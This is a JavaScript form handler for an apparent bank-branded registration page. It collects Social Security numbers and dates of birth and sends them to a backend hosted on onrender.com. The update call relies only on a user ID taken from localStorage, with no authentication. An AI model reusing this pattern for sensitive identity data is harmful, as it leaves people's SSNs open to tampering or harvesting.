document.addEventListener("DOMContentLoaded", function () {
  const checkbox = document.getElementById("agreeCheckbox");
  const ssnInput = document.getElementById("ssn");
  const dobInput = document.getElementById("dob");
  const proceedBtn = document.getElementById("proceedBtn");

  checkbox.addEventListener("change", () => {
    const enabled = checkbox.checked;
    ssnInput.disabled = !enabled;
    dobInput.disabled = !enabled;
    checkFormValidity();
  });

  ssnInput.addEventListener("input", () => {
    validateSSNInput(ssnInput);
    checkFormValidity();
  });

  dobInput.addEventListener("input", checkFormValidity);

  proceedBtn.addEventListener("click", async () => {
    const userId = localStorage.getItem("userId");
    const ssn = ssnInput.value;
    const dob = dobInput.value;
    const loadingOverlay = document.getElementById("loadingOverlay");

    if (!userId) {
      alert("User ID not found. Please restart the registration process.");
      return;
    }

    loadingOverlay.style.display = "flex";

    try {
      const response = await fetch(
        `https://zenithbank-backend.onrender.com/api/users/update/${userId}`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            ssn,
            dob,
          }),
        }
      );

      const result = await response.json();

      if (response.ok) {
        // Wait for 5 seconds before redirecting
        setTimeout(() => {
          window.location.href = "/HTML/signature.html"; // Replace with your next step
        }, 3000);
      } else {
        alert(result.error || "Failed to update user info.");
        loadingOverlay.style.display = "none";
      }
    } catch (err) {
      console.error("Error:", err);
      alert("An error occurred while updating your information.");
      loadingOverlay.style.display = "none";
    }
  });
});

function validateSSNInput(input) {
  input.value = input.value.replace(/\D/g, "").slice(0, 9);
}

function checkFormValidity() {
  const checkbox = document.getElementById("agreeCheckbox");
  const ssn = document.getElementById("ssn").value;
  const dob = document.getElementById("dob").value;
  const proceedBtn = document.getElementById("proceedBtn");

  const isSSNValid = ssn.length === 9;
  const isDOBValid = dob !== "";

  proceedBtn.disabled = !(checkbox.checked && isSSNValid && isDOBValid);
}
